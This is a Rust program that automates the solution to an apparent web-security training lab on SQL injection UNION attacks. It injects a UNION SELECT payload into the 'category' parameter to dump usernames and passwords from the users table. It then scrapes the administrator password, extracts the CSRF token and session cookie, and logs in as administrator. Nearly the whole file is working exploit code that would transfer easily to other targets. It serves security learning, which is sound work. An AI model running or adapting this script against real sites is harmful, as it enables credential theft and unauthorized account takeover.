/**********************************************************************************
*
* Lab: SQL injection UNION attack, retrieving multiple values in a single column
*
* Hack Steps:
*      1. Inject payload into 'category' query parameter to retrieve
*         administrator password from users table using concatenation method
*      2. Fetch the login page
*      3. Extract the csrf token and session cookie
*      4. Login as the administrator
*      5. Fetch the administrator profile
*
***********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0afa00c5032d0b2c81fa7f53003100e9.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "category".yellow());
    print!("⦗1⦘ Retrieving administrator password from users table.. ");
    flush_terminal();

    let payload = "' UNION SELECT null, concat(username , ':', password) from users-- -";
    let injection_response = fetch(&format!("/filter?category={payload}"));
    let body = injection_response.text().unwrap();
    let admin_password = capture_pattern_from_text("<th>administrator:(.*)</th>", &body);

    println!("{} => {}", "OK".green(), admin_password.yellow());
    print!("⦗2⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗3⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let session = get_session_cookie(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗4⦘ Logging in as the administrator.. ");
    flush_terminal();

    let admin_login = login_as_admin(&admin_password, &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗5⦘ Fetching the administrator profile.. ");
    flush_terminal();

    let admin_session = get_session_cookie(&admin_login);
    fetch_with_session("/my-account", &admin_session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_admin(admin_password: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to login as the administrator".red()
        ))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
